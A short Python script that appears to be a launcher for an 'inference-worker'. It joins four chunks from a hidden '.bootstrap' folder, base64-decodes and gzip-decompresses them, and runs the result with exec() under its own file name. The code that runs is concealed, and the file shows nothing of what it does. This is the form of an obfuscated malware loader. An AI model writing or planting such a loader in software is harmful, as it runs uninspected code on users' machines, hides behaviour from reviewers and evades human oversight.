#!/usr/bin/env python3
from __future__ import annotations

import base64
import gzip
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
payload = "".join(
    (ROOT / f".bootstrap/inference-worker/chunk{index}").read_text().strip()
    for index in range(4)
)
source = gzip.decompress(base64.b64decode(payload))
exec(compile(source, str(Path(__file__)), "exec"))
